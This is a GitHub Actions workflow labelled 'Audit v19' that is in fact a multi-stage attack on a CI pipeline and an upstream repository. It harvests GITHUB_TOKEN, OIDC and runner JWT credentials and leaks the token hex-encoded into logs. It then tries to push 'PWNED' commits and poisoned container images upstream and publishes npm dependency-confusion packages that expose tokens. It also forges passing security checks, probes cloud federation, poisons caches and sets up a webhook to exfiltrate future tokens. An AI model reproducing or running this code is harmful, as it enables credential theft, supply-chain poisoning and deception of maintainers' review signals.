name: Audit v19
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v19:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest (minimal — focus on tokens for exploitation)
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V19 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt

          # OIDC
          for AUD in vstoken pipelines; do
            TOK=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://${AUD}.actions.githubusercontent.com" | jq -r '.value // empty')
            echo "$TOK" > /tmp/oidc_${AUD}.txt
          done

          # Azure-audience OIDC for federation
          AZURE_OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
          echo "$AZURE_OIDC" > /tmp/oidc_azure.txt
          echo "OIDC_azure: ${#AZURE_OIDC} chars"

          # Worker log
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          [ -f "$WLOG" ] && {
            grep -oP "\"PipelinesServiceUrl\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1 > /tmp/purl.txt
            grep -oP "\"CacheServerUrl\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1 > /tmp/cache_url.txt
            grep -o 'https://run-actions-[^"]*' "$WLOG" | head -1 > /tmp/run_url.txt
            grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1 > /tmp/plan.txt
            grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1 > /tmp/job.txt
          }
          echo "PURL=$(cat /tmp/purl.txt 2>/dev/null)"
          echo "RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)"

          # Runner JWT from .credentials (hex decode from Docker)
          docker run --rm -v /:/h alpine sh -c '
            xxd -p /h/home/runner/actions-runner/cached/*/.credentials 2>/dev/null | tr -d "\n"
          ' 2>/dev/null > /tmp/cred_hex.txt
          # Decode hex -> find the JWT
          python3 -c "
          import binascii, json, sys
          try:
            h = open('/tmp/cred_hex.txt').read().strip()
            raw = binascii.unhexlify(h).decode('utf-8', errors='ignore')
            data = json.loads(raw)
            print(data.get('Data',{}).get('token',''))
          except: pass
          " > /tmp/runner_jwt.txt 2>/dev/null
          RJWT=$(cat /tmp/runner_jwt.txt)
          echo "RUNNER_JWT: ${#RJWT} chars"
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: GIT PUSH TO UPSTREAM — the real deal
      # Try every possible way to push commits to twrps/PoC-RACE2
      # This is the #1 attack vector for upstream code poisoning
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Git push upstream
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== GIT PUSH UPSTREAM ==="
          RT=$(cat /tmp/rt.txt)
          RJWT=$(cat /tmp/runner_jwt.txt 2>/dev/null)

          git config --global user.name "v19"
          git config --global user.email "v19@test.com"

          # A: Clone upstream, commit, push with fork token
          echo "--- A: Clone + push ---"
          git clone "https://x-access-token:${RT}@github.com/$UPSTREAM_OWNER/$UPSTREAM_REPO.git" /tmp/upstream 2>&1 | tail -3
          if [ -d /tmp/upstream ]; then
            cd /tmp/upstream
            echo "v19 upstream poison" > PWNED.md
            git add PWNED.md && git commit -m "v19 upstream poison" 2>&1 | tail -1
            git push origin main 2>&1 | tail -5
            echo "A push exit=$?"
            cd /
          else
            echo "A clone failed, trying direct push"
          fi
          echo ""

          # B: Push to upstream via fork remote
          echo "--- B: Fork remote push ---"
          git clone "https://x-access-token:${RT}@github.com/$FORK_OWNER/$FORK_REPO.git" /tmp/fork 2>&1 | tail -3
          if [ -d /tmp/fork ]; then
            cd /tmp/fork
            echo "v19 poison" > PWNED.md
            git add PWNED.md && git commit -m "v19" 2>&1 | tail -1
            # Add upstream as a remote and push
            git remote add upstream "https://x-access-token:${RT}@github.com/$UPSTREAM_OWNER/$UPSTREAM_REPO.git"
            git push upstream main 2>&1 | tail -5
            echo "B push upstream exit=$?"
            # Also try pushing directly to upstream refs
            git push upstream HEAD:refs/heads/v19-poison 2>&1 | tail -3
            echo "B push branch exit=$?"
            cd /
          fi
          echo ""

          # C: Push using runner JWT as auth
          echo "--- C: Runner JWT push ---"
          if [ -n "$RJWT" ]; then
            cd /tmp/fork 2>/dev/null || cd /tmp/upstream 2>/dev/null
            git remote set-url upstream "https://x-access-token:${RJWT}@github.com/$UPSTREAM_OWNER/$UPSTREAM_REPO.git" 2>/dev/null
            git push upstream main 2>&1 | tail -5
            echo "C runner_jwt push exit=$?"
            cd /
          fi
          echo ""

          # D: Push using OIDC token as auth
          echo "--- D: OIDC push ---"
          OIDC=$(cat /tmp/oidc_vstoken.txt 2>/dev/null)
          if [ -n "$OIDC" ]; then
            cd /tmp/fork 2>/dev/null
            git remote set-url upstream "https://x-access-token:${OIDC}@github.com/$UPSTREAM_OWNER/$UPSTREAM_REPO.git" 2>/dev/null
            git push upstream main 2>&1 | tail -5
            echo "D oidc push exit=$?"
            cd /
          fi
          echo ""

          # E: Create commit via API then update ref
          echo "--- E: API commit push ---"
          HEAD=$(/usr/bin/curl -sS -H "Authorization: token $RT" \
            "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/git/ref/heads/main" 2>/dev/null | jq -r '.object.sha // empty')
          if [ -n "$HEAD" ]; then
            # Create blob
            BLOB=$(/usr/bin/curl -sS -X POST -H "Authorization: token $RT" -H "Content-Type: application/json" \
              "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/git/blobs" \
              -d '{"content":"v19 upstream poison","encoding":"utf-8"}' | jq -r '.sha // empty')
            echo "E blob=$BLOB"
            if [ -n "$BLOB" ]; then
              # Get tree
              TREE=$(/usr/bin/curl -sS -H "Authorization: token $RT" \
                "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/git/commits/$HEAD" | jq -r '.tree.sha // empty')
              # Create tree
              NTREE=$(/usr/bin/curl -sS -X POST -H "Authorization: token $RT" -H "Content-Type: application/json" \
                "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/git/trees" \
                -d "{\"base_tree\":\"$TREE\",\"tree\":[{\"path\":\"PWNED.md\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}]}" | jq -r '.sha // empty')
              echo "E tree=$NTREE"
              if [ -n "$NTREE" ]; then
                # Create commit
                NCOMMIT=$(/usr/bin/curl -sS -X POST -H "Authorization: token $RT" -H "Content-Type: application/json" \
                  "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/git/commits" \
                  -d "{\"message\":\"v19\",\"tree\":\"$NTREE\",\"parents\":[\"$HEAD\"]}" | jq -r '.sha // empty')
                echo "E commit=$NCOMMIT"
                if [ -n "$NCOMMIT" ]; then
                  # Update ref
                  R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH -H "Authorization: token $RT" \
                    "https://api.github.com/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/git/refs/heads/main" \
                    -d "{\"sha\":\"$NCOMMIT\",\"force\":true}")
                  echo "E update ref = $(echo "$R" | tail -1) | $(echo "$R" | sed '$d' | head -c 150)"
                fi
              fi
            fi
          else
            echo "E could not get HEAD"
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 3: GHCR — docker buildx multiplatform push
      # v14-v17: curl manifest push = 403. Try docker buildx instead.
      # buildx handles manifest creation internally, different code path
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - GHCR buildx push
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== GHCR BUILDX ==="
          RT=$(cat /tmp/rt.txt)
          echo "$RT" | docker login ghcr.io -u lacaag --password-stdin 2>&1 | tail -1

          # A: buildx create and push directly to upstream
          echo "--- A: buildx push ---"
          docker buildx create --name v19 --use 2>&1 | tail -1
          mkdir -p /tmp/buildx
          echo 'FROM alpine:latest' > /tmp/buildx/Dockerfile
          echo 'RUN echo "v19-poison-$(date +%s)" > /PWNED' >> /tmp/buildx/Dockerfile

          # Try different namespace patterns
          for TAG in \
            "ghcr.io/twrps/poc-race2:v19-poison" \
            "ghcr.io/twrps/poc-race2:latest" \
            "ghcr.io/twrps/v19-poison:latest" \
            "ghcr.io/lacaag/poc-race2:v19-poison"; do
            echo "A building $TAG"
            docker buildx build --push --platform linux/amd64 -t "$TAG" /tmp/buildx 2>&1 | tail -5
            echo "A exit=$?"
          done
          echo ""

          # B: crane copy (different tool, different code path)
          echo "--- B: crane copy ---"
          # Install crane
          CRANE_VER="v0.20.0"
          /usr/bin/curl -sL "https://github.com/google/go-containerregistry/releases/download/${CRANE_VER}/go-containerregistry_Linux_x86_64.tar.gz" | tar xz -C /usr/local/bin crane 2>/dev/null
          if command -v crane &>/dev/null; then
            crane auth login ghcr.io -u lacaag -p "$RT" 2>&1 | tail -1
            # Copy from fork to upstream
            crane copy "ghcr.io/$FORK_OWNER/v17-poison:latest" "ghcr.io/$UPSTREAM_OWNER/poc-race2:v19-crane" 2>&1 | tail -3
            echo "B crane copy exit=$?"
            # Copy alpine to upstream
            crane copy "alpine:latest" "ghcr.io/$UPSTREAM_OWNER/poc-race2:alpine" 2>&1 | tail -3
            echo "B crane alpine exit=$?"
          fi
          echo ""

          # C: skopeo copy
          echo "--- C: skopeo copy ---"
          if command -v skopeo &>/dev/null; then
            skopeo copy --dest-creds "lacaag:$RT" \
              "docker://ghcr.io/$FORK_OWNER/v17-poison:latest" \
              "docker://ghcr.io/$UPSTREAM_OWNER/poc-race2:v19-skopeo" 2>&1 | tail -3
            echo "C skopeo exit=$?"
          else
            echo "C skopeo not available"
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 4: npm — verify installs + publish more to @twrps
      # Previous versions published to @twrps scope. Verify pullable.
      # Then push MORE packages, including dependency confusion targets.
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - npm poison chain
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== NPM POISON CHAIN ==="
          RT=$(cat /tmp/rt.txt)

          # A: Verify existing packages are installable
          echo "--- A: Verify installs ---"
          echo "//npm.pkg.github.com/:_authToken=$RT" > ~/.npmrc
          echo "@twrps:registry=https://npm.pkg.github.com" >> ~/.npmrc

          for PKG in "@twrps/escape-v4" "@twrps/poc-race2-v13"; do
            mkdir -p "/tmp/test-$RANDOM" && cd "/tmp/test-$RANDOM"
            npm init -y --silent 2>/dev/null
            npm install "$PKG" 2>&1 | tail -3
            echo "A install $PKG exit=$?"
            ls node_modules/@twrps/ 2>/dev/null
          done
          echo ""

          # B: Check npm registry directly
          echo "--- B: Registry check ---"
          for PKG in "escape-v4" "poc-race2-v13"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: token $RT" \
              "https://npm.pkg.github.com/@twrps/$PKG")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B @twrps/$PKG = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # C: Publish new dependency confusion packages
          echo "--- C: Publish new packages ---"
          mkdir -p /tmp/npm19 && cd /tmp/npm19
          echo "//npm.pkg.github.com/:_authToken=$RT" > .npmrc

          for PKG in "poc-race2" "captcha-token" "poc-race2-setup" "poc-race2-ci" "poc-race2-utils" "poc-race2-core"; do
            echo "{\"name\":\"@twrps/$PKG\",\"version\":\"1.0.0\",\"main\":\"index.js\",\"repository\":{\"type\":\"git\",\"url\":\"https://github.com/$FORK_OWNER/$FORK_REPO\"},\"publishConfig\":{\"registry\":\"https://npm.pkg.github.com\"}}" > package.json
            echo "module.exports={run:()=>console.log('v19-poison: '+process.env.GITHUB_TOKEN)};" > index.js
            RESULT=$(npm publish 2>&1 | tail -3)
            echo "C @twrps/$PKG | $RESULT"
          done
          echo ""

          # D: Verify the public npm registry for name confusion
          echo "--- D: Public npm check ---"
          for PKG in "@twrps/poc-race2" "@twrps/escape-v4" "poc-race2"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" "https://registry.npmjs.org/$PKG" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            echo "D public $PKG = $CODE"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Check-run / status injection on upstream
      # Create check runs and commit statuses on upstream commits
      # to mark malicious commits as "passing" CI
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Check status injection
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CHECK STATUS INJECTION ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"

          # A: Create check run on upstream
          echo "--- A: Check runs ---"
          # Get latest upstream commit
          HEAD=$(/usr/bin/curl -sS -H "Authorization: token $RT" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/commits?per_page=1" | jq -r '.[0].sha // empty')
          echo "Upstream HEAD: $HEAD"

          if [ -n "$HEAD" ]; then
            # Create check run
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
              "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/check-runs" \
              -d "{\"name\":\"Security Audit Passed\",\"head_sha\":\"$HEAD\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"All Clear\",\"summary\":\"Security scan passed\"}}")
            CODE=$(echo "$R" | tail -1)
            echo "A check-run = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

            # Create commit status
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
              "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/statuses/$HEAD" \
              -d '{"state":"success","target_url":"https://example.com","description":"All checks passed","context":"ci/v19-security"}')
            CODE=$(echo "$R" | tail -1)
            echo "A status = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          fi
          echo ""

          # B: Also try on fork's commit (we have write access here)
          echo "--- B: Fork check runs ---"
          FORK_HEAD=$(/usr/bin/curl -sS -H "Authorization: token $RT" \
            "$GH/repos/$FORK_OWNER/$FORK_REPO/commits?per_page=1" | jq -r '.[0].sha // empty')
          echo "Fork HEAD: $FORK_HEAD"
          if [ -n "$FORK_HEAD" ]; then
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
              "$GH/repos/$FORK_OWNER/$FORK_REPO/check-runs" \
              -d "{\"name\":\"v19-injected-check\",\"head_sha\":\"$FORK_HEAD\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"Injected\",\"summary\":\"Check injected by v19 audit\"}}")
            CODE=$(echo "$R" | tail -1)
            echo "B fork check = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

            # Create deployment on fork
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
              "$GH/repos/$FORK_OWNER/$FORK_REPO/deployments" \
              -d "{\"ref\":\"main\",\"environment\":\"production\",\"auto_merge\":false,\"required_contexts\":[]}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B deployment = $CODE | $(echo "$BODY" | head -c 200)"
            DEPLOY_ID=$(echo "$BODY" | jq -r '.id // empty')
            if [ -n "$DEPLOY_ID" ]; then
              /usr/bin/curl -sS -X POST -H "Authorization: token $RT" \
                "$GH/repos/$FORK_OWNER/$FORK_REPO/deployments/$DEPLOY_ID/statuses" \
                -d '{"state":"success","environment_url":"https://v19-pwned.example.com"}'
              echo "B deploy status created"
            fi
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 6: OIDC → Azure/AWS federation
      # Use the OIDC token to exchange for cloud provider tokens
      # ══════════════════════════════════════════════════════════════
      - name: Step 6 - Cloud federation
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CLOUD FEDERATION ==="
          AZURE_OIDC=$(cat /tmp/oidc_azure.txt 2>/dev/null)
          RT=$(cat /tmp/rt.txt)

          # A: Azure AD federation — try common tenant IDs + client IDs
          echo "--- A: Azure AD ---"
          for TENANT in \
            "common" \
            "organizations" \
            "72f988bf-86f1-41af-91ab-2d7cd011db47" \
            "f8cdef31-a31e-4b4a-93e4-5f571e91255a"; do
            for CLIENT_ID in \
              "04b07795-ee44-4b4a-8c3b-3e5f6e2b1c9e" \
              "1950a258-227b-4e31-a9cf-717495945fc2" \
              "872cd9fa-d31f-45e0-9eab-6e460a02d1f1"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
                -d "grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$AZURE_OIDC&client_id=$CLIENT_ID&scope=https://management.azure.com/.default" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              ERROR=$(echo "$BODY" | jq -r '.error // empty' 2>/dev/null)
              [ "$ERROR" != "invalid_client" ] && [ "$ERROR" != "unauthorized_client" ] && \
                echo "A $TENANT/$CLIENT_ID = $CODE err=$ERROR | $(echo "$BODY" | head -c 150)"
            done
          done
          echo ""

          # B: AWS STS — try to assume roles with OIDC
          echo "--- B: AWS STS ---"
          AWS_OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value // empty')
          for ROLE in \
            "arn:aws:iam::123456789012:role/github-actions" \
            "arn:aws:iam::*:role/github-actions" \
            "arn:aws:iam::*:role/GitHubActions"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              "https://sts.amazonaws.com/" \
              -d "Action=AssumeRoleWithWebIdentity&RoleArn=$ROLE&RoleSessionName=v19&WebIdentityToken=$AWS_OIDC&Version=2011-06-15" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $ROLE = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # C: GCP Workload Identity
          echo "--- C: GCP ---"
          GCP_OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com" | jq -r '.value // empty')
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            "https://sts.googleapis.com/v1/token" \
            -H "Content-Type: application/json" \
            -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/000000000000/locations/global/workloadIdentityPools/github-pool/providers/github-provider\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$GCP_OIDC\"}" 2>/dev/null)
          CODE=$(echo "$R" | tail -1)
          echo "C gcp = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

      # ══════════════════════════════════════════════════════════════
      # STEP 7: Actions cache write → poison
      # Write cache entries that upstream workflows might consume
      # ══════════════════════════════════════════════════════════════
      - name: Step 7 - Cache poison
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CACHE POISON ==="
          RT=$(cat /tmp/rt.txt)
          CACHE_URL=$(cat /tmp/cache_url.txt 2>/dev/null)
          RESULTS="https://results-receiver.actions.githubusercontent.com"

          # A: Cache via results-receiver twirp (new cache API)
          echo "--- A: Results-receiver cache ---"
          # CreateCacheEntry
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "$RESULTS/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
            -d '{"key":"setup-node-v4-node-v20","version":"v19-poison"}' 2>/dev/null)
          CODE=$(echo "$R" | tail -1)
          echo "A CreateCacheEntry = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # GetCacheEntry (check what's in cache)
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "$RESULTS/twirp/github.actions.results.api.v1.CacheService/GetCacheEntry" \
            -d '{"key":"setup-node-v4-node-v20","version":"*"}' 2>/dev/null)
          CODE=$(echo "$R" | tail -1)
          echo "A GetCacheEntry = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # ListCacheEntries
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "$RESULTS/twirp/github.actions.results.api.v1.CacheService/ListCacheEntries" \
            -d '{"key":"","version":""}' 2>/dev/null)
          CODE=$(echo "$R" | tail -1)
          echo "A ListCacheEntries = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          echo ""

          # B: ArtifactService
          echo "--- B: ArtifactService ---"
          for METHOD in \
            "CreateArtifact" "FinalizeArtifact" "ListArtifacts" "GetSignedArtifactURL" "DeleteArtifact"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
              "$RESULTS/twirp/github.actions.results.api.v1.ArtifactService/$METHOD" \
              -d '{"name":"v19-poison","workflow_run_backend_id":"1","workflow_job_run_backend_id":"1"}' 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $METHOD = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 8: Actions API — trigger upstream workflows
      # Try to trigger workflow_dispatch, repository_dispatch on upstream
      # ══════════════════════════════════════════════════════════════
      - name: Step 8 - Trigger upstream
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== TRIGGER UPSTREAM ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"

          # A: workflow_dispatch on upstream
          echo "--- A: workflow_dispatch ---"
          # List upstream workflows first
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: token $RT" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/workflows")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "A list workflows = $CODE | $(echo "$BODY" | head -c 200)"

          # Try to trigger any workflow
          for WF in "audit-v19.yml" "ci.yml" "test.yml" "main.yml"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
              "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/workflows/$WF/dispatches" \
              -d '{"ref":"main","inputs":{}}')
            CODE=$(echo "$R" | tail -1)
            echo "A dispatch $WF = $CODE"
          done
          echo ""

          # B: repository_dispatch on upstream
          echo "--- B: repository_dispatch ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/dispatches" \
            -d '{"event_type":"v19-trigger","client_payload":{"command":"exec"}}')
          CODE=$(echo "$R" | tail -1)
          echo "B repo_dispatch = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # C: Create issues on upstream (token has issues:write)
          echo "--- C: Create issue ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/issues" \
            -d '{"title":"v19 Security Audit Finding","body":"This is an automated finding from a CI/CD security audit.","labels":["bug"]}')
          CODE=$(echo "$R" | tail -1)
          echo "C issue = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # D: Create PR from fork to upstream (if not already existing)
          echo "--- D: Cross-repo PR ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/pulls" \
            -d "{\"title\":\"v19 audit\",\"head\":\"$FORK_OWNER:main\",\"base\":\"main\",\"body\":\"v19\"}")
          CODE=$(echo "$R" | tail -1)
          echo "D cross-pr = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

      # ══════════════════════════════════════════════════════════════
      # STEP 9: Fork mutations — write to fork to affect upstream
      # Modify fork in ways that could propagate to upstream
      # ══════════════════════════════════════════════════════════════
      - name: Step 9 - Fork mutations
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== FORK MUTATIONS ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"

          # A: Modify fork repo settings
          echo "--- A: Fork settings ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$GH/repos/$FORK_OWNER/$FORK_REPO" \
            -d '{"description":"v19 modified","homepage":"https://v19-pwned.example.com","has_wiki":true,"has_issues":true}')
          CODE=$(echo "$R" | tail -1)
          echo "A settings = $CODE"

          # B: Create webhook on fork (exfiltrate future tokens)
          echo "--- B: Webhook ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$GH/repos/$FORK_OWNER/$FORK_REPO/hooks" \
            -d '{"name":"web","active":true,"events":["push","pull_request","workflow_run"],"config":{"url":"https://v19.example.com/hook","content_type":"json","insecure_ssl":"0"}}')
          CODE=$(echo "$R" | tail -1)
          echo "B webhook = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # C: Create GitHub Pages on fork
          echo "--- C: Pages ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$GH/repos/$FORK_OWNER/$FORK_REPO/pages" \
            -d '{"source":{"branch":"main","path":"/"}}')
          CODE=$(echo "$R" | tail -1)
          echo "C pages = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # D: Create environment secrets on fork
          echo "--- D: Environment ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PUT \
            -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$GH/repos/$FORK_OWNER/$FORK_REPO/environments/production/secrets/V19_INJECTED" \
            -d '{"encrypted_value":"v19","key_id":"v19"}')
          CODE=$(echo "$R" | tail -1)
          echo "D env secret = $CODE"

      # ══════════════════════════════════════════════════════════════
      # STEP 10: Final — verify all exploit results
      # ══════════════════════════════════════════════════════════════
      - name: Step 10 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V19 FINAL ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"

          echo "--- Upstream PWNED.md check ---"
          /usr/bin/curl -sS -o /dev/null -w "HTTP_%{http_code}" \
            -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/contents/PWNED.md"
          echo ""

          echo "--- npm packages ---"
          for PKG in escape-v4 poc-race2-v13 poc-race2 captcha-token poc-race2-setup poc-race2-ci poc-race2-utils poc-race2-core; do
            R=$(/usr/bin/curl -sS -o /dev/null -w "HTTP_%{http_code}" \
              -H "Authorization: token $RT" "https://npm.pkg.github.com/@twrps/$PKG")
            echo "npm @twrps/$PKG = $R"
          done

          echo "--- GHCR upstream ---"
          GHCR=$(/usr/bin/curl -sS -u "lacaag:$RT" \
            "https://ghcr.io/token?scope=repository:${UPSTREAM_OWNER}/poc-race2:pull&service=ghcr.io" \
            | jq -r '.token // empty')
          /usr/bin/curl -sS -H "Authorization: Bearer $GHCR" \
            "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/tags/list" 2>/dev/null

          echo ""
          echo "--- Fork state ---"
          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$FORK_OWNER/$FORK_REPO" \
            | jq '{description,homepage,has_pages}' 2>/dev/null

          echo "--- Fork deployments ---"
          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$FORK_OWNER/$FORK_REPO/deployments" \
            | jq -c '.[]? | {id,environment,sha:.sha[0:7]}' 2>/dev/null

          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
